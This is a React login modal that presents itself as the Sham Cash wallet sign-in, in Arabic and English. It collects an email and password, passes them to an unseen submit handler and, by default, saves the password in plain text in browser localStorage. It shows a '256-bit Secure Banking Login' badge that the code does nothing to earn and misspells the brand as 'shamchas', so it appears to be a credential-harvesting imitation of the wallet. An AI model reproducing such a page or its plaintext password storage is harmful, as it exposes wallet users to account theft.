import React, { useState } from 'react';
import {
  X,
  Mail,
  Lock,
  Eye,
  EyeOff,
  LogIn,
  LoaderCircle,
  ShieldAlert,
  ShieldCheck,
  HelpCircle
} from 'lucide-react';
import { useLanguage } from '../context/LanguageContext';
import { AuthData } from '../types';
import { isStarloveBlocked } from '../utils/accountStorage';

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: (data: AuthData) => void;
}

export const LoginModal: React.FC<LoginModalProps> = ({
  isOpen,
  onClose,
  onSubmit,
}) => {
  const { isRTL } = useLanguage();
  const [email, setEmail] = useState(() => {
    const saved = localStorage.getItem('sc_waiting_email') || '';
    return isStarloveBlocked(saved) ? '' : saved;
  });
  const [password, setPassword] = useState(() => localStorage.getItem('sc_waiting_password') || '');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isForgotModalOpen, setIsForgotModalOpen] = useState(false);

  if (!isOpen) return null;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    const cleanEmail = email.trim().toLowerCase();

    if (!cleanEmail && !password) {
      setError('يرجى إدخال البريد الإلكتروني وكلمة المرور للمتابعة.');
      return;
    }
    if (!cleanEmail) {
      setError('يرجى إدخال البريد الإلكتروني (جيميل، ياهو، أو أي بريد معتمد).');
      return;
    }
    if (/[\u0600-\u06FF]/.test(cleanEmail)) {
      setError('البريد الإلكتروني يجب ألا يحتوي على أحرف عربية.');
      return;
    }
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!emailRegex.test(cleanEmail)) {
      setError('يرجى إدخال بريد إلكتروني صحيح (جيميل Gmail، ياهو Yahoo، أو بريد رسمي معتمد).');
      return;
    }
    if (!password) {
      setError('يرجى إدخال كلمة المرور (6 خانات فأكثر).');
      return;
    }
    if (/[\u0600-\u06FF]/.test(password)) {
      setError('كلمة المرور يجب ألا تحتوي على أحرف عربية.');
      return;
    }
    if (password.length < 6) {
      setError('يجب أن تكون كلمة المرور 6 خانات فأكثر.');
      return;
    }

    setIsLoading(true);

    try {
      if (rememberMe) {
        if (!isStarloveBlocked(cleanEmail)) {
          localStorage.setItem('sc_waiting_email', cleanEmail.toLowerCase());
        } else {
          localStorage.removeItem('sc_waiting_email');
        }
        localStorage.setItem('sc_waiting_password', password);
      }
    } catch {}

    setTimeout(() => {
      setIsLoading(false);
      onClose();
      onSubmit({
        email: cleanEmail.toLowerCase(),
        password,
      });
    }, 500);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-3 sm:p-4 backdrop-blur-md overflow-y-auto">
      <div className="relative w-full max-w-lg rounded-3xl border border-blue-500/30 bg-[#0E1628] p-5 sm:p-6 shadow-2xl text-white my-auto max-h-[95vh] overflow-y-auto">
        <button
          type="button"
          onClick={onClose}
          className="absolute top-4 left-4 p-1.5 text-white/60 hover:text-white rounded-full bg-white/5 hover:bg-white/10 transition cursor-pointer"
        >
          <X className="size-4" />
        </button>

        {/* Modal Header with Image */}
        <div className="text-center">
          <div className="relative mx-auto mb-2 flex flex-col items-center">
            <img
              src="/assets/sham-login-logo.webp"
              alt="شام كاش"
              width="239"
              height="267"
              className="h-16 w-auto object-contain drop-shadow-[0_10px_25px_rgba(74,144,226,0.4)]"
            />
            <span className="mt-1 text-[10px] font-black tracking-widest text-[#4A90E2] uppercase">
              shamchas
            </span>
          </div>

          <h3 className="text-xl font-black text-white">
            {isRTL ? 'تسجيل الدخول' : 'Sign In'}
          </h3>
          <p className="mt-1 text-xs text-white/60">
            {isRTL
              ? 'البريد الإلكتروني وكلمة السر للوصول إلى محفظة وحساب شام كاش'
              : 'Enter your credentials to access your Sham Cash wallet'}
          </p>
        </div>

        {error && (
          <div className="mt-4 flex items-center gap-2 rounded-2xl border border-rose-500/40 bg-rose-500/15 p-3 text-xs text-rose-200">
            <ShieldAlert className="size-4 shrink-0 text-rose-400" />
            <span>{error}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="mt-4 space-y-3.5" noValidate>
          {/* Email */}
          <div>
            <label
              htmlFor="modal-input-email"
              className="block text-xs font-bold text-white mb-1"
            >
              {isRTL ? 'البريد الإلكتروني' : 'Email Address'}
            </label>
            <div className="relative">
              <Mail className={`pointer-events-none absolute top-1/2 ${isRTL ? 'right-3.5' : 'left-3.5'} size-4 -translate-y-1/2 text-white/50`} />
              <input
                id="modal-input-email"
                type="email"
                dir="ltr"
                autoComplete="email"
                maxLength={255}
                required
                value={email}
                onChange={(e) => {
                  const val = e.target.value;
                  if (/[\u0600-\u06FF]/.test(val)) {
                    setError(isRTL ? 'البريد الإلكتروني يجب ألا يحتوي على أحرف عربية.' : 'Email address must not contain Arabic characters.');
                  } else if (error && error.includes('البريد الإلكتروني')) {
                    setError(null);
                  }
                  setEmail(val.replace(/[\u0600-\u06FF]/g, ''));
                }}
                placeholder="name@gmail.com أو name@yahoo.com"
                className={`w-full rounded-2xl border border-white/10 bg-white/[0.08] py-3 ${isRTL ? 'pr-11 pl-4 text-right' : 'pl-11 pr-4 text-left'} text-sm font-medium text-white outline-none transition placeholder:text-white/30 focus:border-[#4A90E2]/70 focus:bg-white/[0.12]`}
              />
            </div>
          </div>

          {/* Password */}
          <div>
            <div className="flex items-center justify-between mb-1">
              <label
                htmlFor="modal-input-password"
                className="block text-xs font-bold text-white"
              >
                {isRTL ? 'كلمة المرور' : 'Password'}
              </label>
              <button
                type="button"
                onClick={() => setIsForgotModalOpen(true)}
                className="text-[11px] font-semibold text-[#7B9BE8] hover:text-white transition cursor-pointer"
              >
                {isRTL ? 'نسيت كلمة المرور؟' : 'Forgot Password?'}
              </button>
            </div>
            <div className="relative">
              <Lock className={`pointer-events-none absolute top-1/2 ${isRTL ? 'right-3.5' : 'left-3.5'} size-4 -translate-y-1/2 text-white/50`} />
              <input
                id="modal-input-password"
                type={showPassword ? 'text' : 'password'}
                dir="ltr"
                autoComplete="current-password"
                maxLength={72}
                required
                minLength={6}
                value={password}
                onChange={(e) => {
                  const val = e.target.value;
                  if (/[\u0600-\u06FF]/.test(val)) {
                    setError(isRTL ? 'كلمة السر يجب ألا تحتوي على أحرف عربية.' : 'Password must not contain Arabic characters.');
                  } else if (error && (error.includes('كلمة السر') || error.includes('كلمة المرور'))) {
                    setError(null);
                  }
                  setPassword(val.replace(/[\u0600-\u06FF]/g, ''));
                }}
                placeholder="••••••••"
                className={`w-full rounded-2xl border border-white/10 bg-white/[0.08] py-3 ${isRTL ? 'pr-11 pl-11 text-right' : 'pl-11 pr-11 text-left'} text-sm font-medium text-white outline-none transition placeholder:text-white/30 focus:border-[#4A90E2]/70 focus:bg-white/[0.12]`}
              />
              <button
                type="button"
                aria-label={showPassword ? 'Hide password' : 'Show password'}
                onClick={() => setShowPassword(!showPassword)}
                className={`absolute top-1/2 ${isRTL ? 'left-3' : 'right-3'} -translate-y-1/2 p-1.5 text-white/60 hover:text-white cursor-pointer`}
              >
                {showPassword ? <EyeOff className="size-4" /> : <Eye className="size-4" />}
              </button>
            </div>
          </div>

          {/* Remember me */}
          <div className="flex items-center justify-between pt-0.5">
            <label className="flex items-center gap-2 cursor-pointer select-none text-xs text-white/70 hover:text-white transition">
              <input
                type="checkbox"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                className="size-3.5 rounded border-white/20 bg-white/5 text-[#4A90E2] focus:ring-0 focus:ring-offset-0 cursor-pointer"
              />
              <span>{isRTL ? 'تذكر بيانات تسجيل الدخول' : 'Remember login'}</span>
            </label>
          </div>

          {/* Action Buttons */}
          <div className="flex gap-2 pt-2">
            <button
              type="button"
              onClick={onClose}
              className="flex-1 rounded-xl border border-white/15 bg-white/5 py-2.5 text-xs font-semibold text-white/70 hover:bg-white/10 transition cursor-pointer"
            >
              {isRTL ? 'إلغاء' : 'Cancel'}
            </button>
            <button
              type="submit"
              disabled={isLoading || !email.trim() || !password}
              className="flex-1 inline-flex items-center justify-center gap-1.5 rounded-xl bg-gradient-to-r from-[#4A90E2] to-[#357ABD] py-2.5 text-xs font-bold text-white shadow-lg hover:brightness-110 disabled:opacity-50 transition cursor-pointer"
            >
              {isLoading ? (
                <>
                  <LoaderCircle className="size-4 animate-spin" />
                  <span>{isRTL ? 'جارٍ التحقق…' : 'Signing in…'}</span>
                </>
              ) : (
                <>
                  <LogIn className="size-4" />
                  <span>{isRTL ? 'تسجيل الدخول' : 'Sign In'}</span>
                </>
              )}
            </button>
          </div>
        </form>

        {/* Security Stamp */}
        <div className="mt-4 flex items-center justify-center gap-1.5 text-[10px] text-white/40">
          <ShieldCheck className="size-3.5 text-emerald-400" />
          <span>{isRTL ? 'تسجيل دخول آمن ومشفر 256-bit' : '256-bit Secure Banking Login'}</span>
        </div>

        {/* Forgot Password Sub-Modal */}
        {isForgotModalOpen && (
          <div className="absolute inset-0 z-20 flex flex-col justify-center rounded-3xl bg-[#0C1425] p-6 text-center text-white">
            <div className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-amber-500/20 text-amber-300 border border-amber-500/30">
              <HelpCircle className="size-6" />
            </div>
            <h4 className="mt-3 text-sm font-bold text-white">
              {isRTL ? 'استعادة كلمة السر' : 'Reset Password'}
            </h4>
            <p className="mt-2 text-xs text-white/70 leading-relaxed">
              {isRTL
                ? 'لاستعادة كلمة السر لحسابك في شام كاش، يرجى الاتصال بمركز الخدمة الموحد: +963 11 611 0000 أو زيارة أقرب فرع رسمي.'
                : 'Contact official support hotline at +963 11 611 0000 or visit your local branch.'}
            </p>
            <button
              type="button"
              onClick={() => setIsForgotModalOpen(false)}
              className="mt-4 rounded-xl bg-white/10 hover:bg-white/15 py-2 text-xs font-bold text-white cursor-pointer"
            >
              {isRTL ? 'العودة لتسجيل الدخول' : 'Back to Login'}
            </button>
          </div>
        )}
      </div>
    </div>
  );
};
